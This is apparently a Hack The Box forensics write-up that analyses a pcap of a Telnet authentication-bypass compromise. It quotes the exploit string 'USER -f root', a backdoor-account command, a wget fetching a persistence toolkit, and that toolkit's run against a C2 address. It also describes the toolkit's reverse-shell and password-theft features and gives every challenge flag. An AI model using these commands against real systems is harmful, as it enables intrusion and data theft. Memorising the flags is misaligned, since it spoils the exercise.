# Telly 

<img width="100" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/tlogo.png" />

## SOC - Very Easy

> ### Sherlock Scenario
> You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.


- We download the required `.zip` containg a single `.pcap` file:
  - `monitoringservice_export_202610AM-11AM.pcapng`

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t1.png" />

***

## Tasks:

### Task 1:
#### What CVE is associated with the vulnerability exploited in the Telnet protocol?

- To begin we start with searching packets with the `Telnet` protocol.
- We begin looking through the packets and see that the first few packets are different from the rest, setting a new environment variable as well as some other settings and spot the line: `suppress go ahead`.
- We do some research and find [**CVE-2026-24061**](https://nvd.nist.gov/vuln/detail/CVE-2026-24061).
>[!NOTE]
> ### CVE-2026-24061:
> A critical remote authentication bypass vulnerability in the GNU InetUtils telnetd server, affecting versions
> 1.9.3 through 2.7.  It allows unauthenticated attackers to gain full root-level access to vulnerable systems by exploiting improper > handling of the USER environment variable during Telnet NEW-ENVIRON negotiation.
> - **CVSS Score:** 9.8 (Critical)
> - **Attack Vector:** Network (remote, unauthenticated)
> - **Exploitation:** Requires no user interaction; attackers set the USER variable to -f root, which causes the login process to skip authentication entirely. 
> - **Impact:** Full system compromise, including data theft, persistence, and lateral movement. 
> - **Fixed In:** GNU InetUtils version 2.8 and later.
> - **Affected Systems:** Legacy Unix/Linux systems, embedded devices, IoT, network appliances, and OT/industrial infrastructure still using Telnet.

From the packet we selected, we can right click and `Follow > TCP Stream` where we notice the line:

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t2.png" />

```
. .38400,38400....#.kali:0.0....'..USER.-f root.DISPLAY.kali:0.0......XTERM-256COLOR..
```

- This line, `USER.-f root` is a sign of a user attempting to exploit CVE-2026-24061, as stated earlier causes the login process to skip authentication entirely.

- **Flag for task:**
```
CVE-2026-24061
```

***
### Task 2:
#### When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?

- As per the last task, this is asking the time of our network packet, which is `2026-01-27 10:39:28`

- **Flag for task:**
```
2026-01-27 10:39:28
```

***
### Task 3:
#### What is the hostname of the targeted server?

- Another question associated with the same packet, we scroll down and see the hostname once the user gets access, `root@backup-secondary`.

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t3.png" />

- **Flag for task:**
```
backup-secondary
```

***
### Task 4:
#### The attacker created a backdoor account to maintain future access. What username and password were set for that account?

- Scrolling down again in the same packet reveals the commands the user input once they gained root access.
- From here we can see the line:

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t4.png" />

```
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd.[201~
```

- This indicates that they created a user account with the credentials: `cleanupsvc:YouKnowWhoiam69`.

- **Flag for task:**
```
cleanupsvc:YouKnowWhoiam69
```

***
### Task 5:
#### What was the full command the attacker used to download the persistence script?

- We continue scrolling down as we can see the entire session and all the commands the attacker entered.

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t5.png" />

```
wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
```

>[!NOTE]
> The script being downloaded (`linper.sh`) is a Linux persistence toolkit, designed to install, enumerate, or remove various backdoors and reverse shells on a compromised Linux system. It is intended for use in Capture The Flag (CTF) challenges and penetration testing, but as the script itself warns, it should not be used unethically or illegally.
>
> **Core functionality:**
> The script automates the process of establishing persistent access. When executed with the right options (like `-i <attacker-IP> -p <port>`), it performs these key actions:
> - **Enumerates Available Reverse Shell Methods:** It checks for the presence of numerous interpreters and tools on the system (e.g., `bash`, `python`, `perl`, `php`, `nc`, `socat`, `gdb`, `node`, etc.).
> - **Installs Persistence via Multiple "Doors":** For each working method found, it attempts to install a reverse shell payload through various common persistence mechanisms, including:
>   - User's `~/.bashrc`
>   - Various crontab locations (user, system, cron.d, cron.hourly/daily/weekly/monthly)
>   - Systemd service units
>   - `/etc/rc.local`
>   - `/etc/skel/.bashrc` (affecting new users)
> - **Uses Stealth Techniques: With the `-s` (stealth) flag, it tries to hide its activity by:**
>   - Using dotfiles (hidden files) for its payloads (e.g., `.service` files).
>   - Timestomping installed files to match `/etc/passwd`.
>   - Installing a wrapper function for `crontab` that filters out its own entries from being displayed.
> - **Offers Additional Attack Modules:**
>   - Web Server Poisoning: If the web user (e.g., `www-data`) has a writable directory, it drops a PHP reverse shell there.
>   - Sudo Hijacking: If the user has `sudo` rights, it adds a function to `~/.bashrc` that steals the user's password when `sudo` is next used and exfiltrates it via a base64-encoded GET request to the attacker's server.
>   - Enumeration: It can enumerate readable shadow files (`-e`) or check which persistence methods would be possible without installing them (`-d` for dry-run).
> - **Includes a Cleanup Function:** Using the `-c` flag with the same `-i` (rhost), it attempts to remove all traces of the backdoors it installed for that specific attacker IP.

- **Flag for task:**
```
wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
```

***
### Task 6:
#### The attacker installed remote access persistence using the persistence script. What is the C2 IP address?

- After scrolling down, we observe that after the user installed the script we see the command the user entered to install remote access persistence using the persistence script:
- The command is heavily obfuscated and broken up in the wireshark logs, but we're able to make it out:

```
root@backup-secondary: /tmp.root@backup-secondary:/tmp# bash linper.sh --enum-defenses -i 91.99.25.54 -p 5599 --stealth-mode
```

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t6.png" />

>[!NOTE]
> This command executes the `linper.sh` script in defense enumeration mode (`--enum-defenses`), which checks the system for Tripwire file integrity policies that could detect unauthorized changes to common persistence locations (e.g., cron, systemd, bashrc). Although the attacker supplied an IP (`-i 91.99.25.54`), port (`-p 5599`), and the `--stealth-mode` flag, these are ignored because the script exits immediately after the enumeration function completes—before any persistence installation or stealth modifications occur. The inclusion of these unused parameters suggests the attacker may have reused a command template or is preparing for a subsequent, full-featured run. Overall, this activity represents reconnaissance: the attacker is probing whether the compromised host employs file integrity monitoring, a key step in deciding how to deploy persistent backdoors without detection.


- **Flag for task:**
```
91.99.25.54
```

***
### Task 7:
#### The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?

- Once the user switches from the `/tmp` directory to the `/opt` directory they run `ls -la` and find the file:

```
credit-cards-25-blackfriday.db
```

Upon finding this, with their root access they host an HTTP server using:

```
python3 -m http-server 6932
```

Once the server is hosted and running, we can see the user then extracting the file from the server:

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t7.png" />

```
Serving HTTP on 0.0.0.0 port 6932 (http://0.0.0.0:6932/) ...
192.168.72.131 - - [27/Jan/2026 10:49:52] "GET / HTTP/1.1" 200 -
192.168.72.131 - - [27/Jan/2026 10:49:52] code 404, message File not found
192.168.72.131 - - [27/Jan/2026 10:49:52] "GET /favicon.ico HTTP/1.1" 404 -
192.168.72.131 - - [27/Jan/2026 10:49:54] "GET /credit-cards-25-blackfriday.db HTTP/1.1" 200 -
```

- With this, we can click the specific line in the TCP stream and on our Wireshark client, it jumps to that packet and gives us the time, in this case `2026-01-27 10:49:54`.

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t8.png" />

- **Flag for task:**
```
2026-01-27 10:49:54
```

***
### Task 8:
#### Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.

- From the file extraction we can find, we `Follow > HTTP Stream` and the server response contains the information. Although heavily obfuscated we can see it by changing the **Show as:** field from `ASCII` to `RAW`.

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/t9.png" />

- The credit card number for Quinn Harris is **5312269047781209**. This value is extracted from the SQLite database found in the HTTP response, where the binary data `00 12 df 7b 05 8b 57 59` corresponds to the integer `0x0012df7b058b5759`, which equals 5,312,269,047,781,209 in decimal.

- **Flag for task:**
```
5312269047781209
```

***

<img width="250" alt="image" src="https://github.com/ty-bradley/HacktheBox/blob/main/Sherlocks/Telly/Images/tclear.png" />
